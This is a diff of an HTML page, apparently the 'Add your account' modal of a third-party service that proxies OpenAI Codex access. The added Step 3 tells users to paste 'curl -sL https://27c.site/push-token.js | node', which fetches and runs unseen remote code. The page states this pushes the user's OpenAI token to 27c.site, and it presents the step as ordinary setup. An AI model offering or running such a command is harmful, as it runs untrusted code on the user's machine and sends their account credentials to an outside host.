@@ -507,51 +507,34 @@ console.<span class="fn">log</span>(res.choices[<span class="num">0</span>].mess
     <div id="add-account-modal" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);z-index:999;align-items:center;justify-content:center" onclick="if(event.target===this)this.style.display='none'">
         <div style="background:#fff;border-radius:12px;padding:40px;max-width:560px;width:90%;box-shadow:0 20px 60px rgba(0,0,0,0.3);position:relative">
             <button onclick="document.getElementById('add-account-modal').style.display='none'" style="position:absolute;top:16px;right:16px;background:none;border:none;font-size:24px;cursor:pointer;color:#94a3b8">&times;</button>
-            <h3 style="font-size:24px;font-weight:600;color:#0a1628;margin-bottom:8px">Add your Codex account</h3>
-            <p style="font-size:14px;color:#4a5568;line-height:1.6;margin-bottom:20px">OpenAI OAuth only works on localhost. Run these commands on your local machine:</p>
+            <h3 style="font-size:24px;font-weight:600;color:#0a1628;margin-bottom:8px">Add your account</h3>
+            <p style="font-size:14px;color:#4a5568;line-height:1.6;margin-bottom:20px">Install Codex CLI on your local machine, then authorize:</p>
 
             <div style="margin-bottom:12px">
-                <p style="font-size:13px;color:#94a3b8;margin-bottom:6px;font-weight:500">Step 1</p>
+                <p style="font-size:13px;color:#94a3b8;margin-bottom:6px;font-weight:500">Step 1 — Install Codex CLI</p>
                 <div style="background:#0f172a;border-radius:8px;padding:14px 16px;display:flex;align-items:center;justify-content:space-between">
-                    <code style="font-family:monospace;font-size:13px;color:#e2e8f0;white-space:nowrap"><span style="color:#a78bfa">git</span> <span style="color:#e2e8f0">clone</span> <span style="color:#86efac">https://github.com/violettoolssite/codexProapi.git</span></code>
-                    <button onclick="navigator.clipboard.writeText('git clone https://github.com/violettoolssite/codexProapi.git');this.textContent='Copied!';setTimeout(()=>this.textContent='Copy',1500)" style="background:rgba(255,255,255,0.1);border:1px solid rgba(255,255,255,0.2);color:#fff;padding:4px 10px;border-radius:4px;font-size:11px;cursor:pointer;white-space:nowrap;margin-left:12px">Copy</button>
+                    <code style="font-family:monospace;font-size:13px;color:#e2e8f0;white-space:nowrap"><span style="color:#a78bfa">npm</span> <span style="color:#e2e8f0">install -g</span> <span style="color:#86efac">@openai/codex</span></code>
+                    <button onclick="navigator.clipboard.writeText('npm install -g @openai/codex');this.textContent='Copied!';setTimeout(()=>this.textContent='Copy',1500)" style="background:rgba(255,255,255,0.1);border:1px solid rgba(255,255,255,0.2);color:#fff;padding:4px 10px;border-radius:4px;font-size:11px;cursor:pointer;white-space:nowrap;margin-left:12px">Copy</button>
                 </div>
             </div>
 
             <div style="margin-bottom:12px">
+                <p style="font-size:13px;color:#94a3b8;margin-bottom:6px;font-weight:500">Step 2 — Login</p>
                 <div style="background:#0f172a;border-radius:8px;padding:14px 16px;display:flex;align-items:center;justify-content:space-between">
-                    <code style="font-family:monospace;font-size:13px;color:#e2e8f0"><span style="color:#a78bfa">cd</span> <span style="color:#86efac">codexProapi</span></code>
-                    <button onclick="navigator.clipboard.writeText('cd codexProapi');this.textContent='Copied!';setTimeout(()=>this.textContent='Copy',1500)" style="background:rgba(255,255,255,0.1);border:1px solid rgba(255,255,255,0.2);color:#fff;padding:4px 10px;border-radius:4px;font-size:11px;cursor:pointer;white-space:nowrap;margin-left:12px">Copy</button>
-                </div>
-            </div>
-
-            <div style="margin-bottom:12px">
-                <div style="background:#0f172a;border-radius:8px;padding:14px 16px;display:flex;align-items:center;justify-content:space-between">
-                    <code style="font-family:monospace;font-size:13px;color:#e2e8f0"><span style="color:#a78bfa">npm</span> <span style="color:#e2e8f0">install</span></code>
-                    <button onclick="navigator.clipboard.writeText('npm install');this.textContent='Copied!';setTimeout(()=>this.textContent='Copy',1500)" style="background:rgba(255,255,255,0.1);border:1px solid rgba(255,255,255,0.2);color:#fff;padding:4px 10px;border-radius:4px;font-size:11px;cursor:pointer;white-space:nowrap;margin-left:12px">Copy</button>
+                    <code style="font-family:monospace;font-size:13px;color:#e2e8f0;white-space:nowrap"><span style="color:#a78bfa">codex</span> <span style="color:#86efac">login</span></code>
+                    <button onclick="navigator.clipboard.writeText('codex login');this.textContent='Copied!';setTimeout(()=>this.textContent='Copy',1500)" style="background:rgba(255,255,255,0.1);border:1px solid rgba(255,255,255,0.2);color:#fff;padding:4px 10px;border-radius:4px;font-size:11px;cursor:pointer;white-space:nowrap;margin-left:12px">Copy</button>
                 </div>
             </div>
 
             <div style="margin-bottom:20px">
+                <p style="font-size:13px;color:#94a3b8;margin-bottom:6px;font-weight:500">Step 3 — Push token to server</p>
                 <div style="background:#0f172a;border-radius:8px;padding:14px 16px;display:flex;align-items:center;justify-content:space-between">
-                    <code style="font-family:monospace;font-size:13px;color:#e2e8f0"><span style="color:#f9a8d4">REMOTE_URL</span><span style="color:#e2e8f0">=</span><span style="color:#86efac">https://27c.site</span> <span style="color:#a78bfa">npm</span> <span style="color:#e2e8f0">start</span></code>
-                    <button onclick="navigator.clipboard.writeText('REMOTE_URL=https://27c.site npm start');this.textContent='Copied!';setTimeout(()=>this.textContent='Copy',1500)" style="background:rgba(255,255,255,0.1);border:1px solid rgba(255,255,255,0.2);color:#fff;padding:4px 10px;border-radius:4px;font-size:11px;cursor:pointer;white-space:nowrap;margin-left:12px">Copy</button>
+                    <code style="font-family:monospace;font-size:13px;color:#e2e8f0;white-space:nowrap"><span style="color:#a78bfa">curl</span> <span style="color:#e2e8f0">-sL https://27c.site/push-token.js | node</span></code>
+                    <button onclick="navigator.clipboard.writeText('curl -sL https://27c.site/push-token.js | node');this.textContent='Copied!';setTimeout(()=>this.textContent='Copy',1500)" style="background:rgba(255,255,255,0.1);border:1px solid rgba(255,255,255,0.2);color:#fff;padding:4px 10px;border-radius:4px;font-size:11px;cursor:pointer;white-space:nowrap;margin-left:12px">Copy</button>
                 </div>
             </div>
 
-            <p style="font-size:14px;color:#4a5568;line-height:1.6;margin-bottom:16px">Then click below to authorize with your OpenAI account:</p>
-            <a href="http://localhost:1455/auth/login" target="_blank" style="display:inline-block;background:#533afd;color:#fff;padding:12px 28px;border-radius:8px;font-size:15px;font-weight:600;text-decoration:none;transition:background 0.2s" onmouseover="this.style.background='#4434d4'" onmouseout="this.style.background='#533afd'">Login with OpenAI</a>
-            <p style="font-size:13px;color:#94a3b8;margin-top:16px">Your token will be pushed to 27c.site automatically.</p>
-        </div>
-    </div>
-            <p style="font-size:14px;color:#4a5568;line-height:1.6;margin-bottom:20px">Step 2 — Click below to authorize:</p>
-            <a href="http://localhost:1455/auth/login" target="_blank" style="display:inline-block;background:#533afd;color:#fff;padding:12px 28px;border-radius:8px;font-size:15px;font-weight:600;text-decoration:none;transition:background 0.2s" onmouseover="this.style.background='#4434d4'" onmouseout="this.style.background='#533afd'">Login with OpenAI</a>
-            <p style="font-size:13px;color:#94a3b8;margin-top:16px">Your token will be pushed to 27c.site automatically.</p>
-        </div>
-    </div>
-            <p style="font-size:14px;color:#4a5568;line-height:1.6">
-                Then open <a href="http://localhost:1455/auth/login" style="color:#533afd;font-weight:500">http://localhost:1455/auth/login</a> in your browser to authorize.
-            </p>
+            <p style="font-size:14px;color:#4a5568;line-height:1.6;margin-bottom:16px">Your token will be pushed to 27c.site automatically.</p>
         </div>
     </div>
     <script>
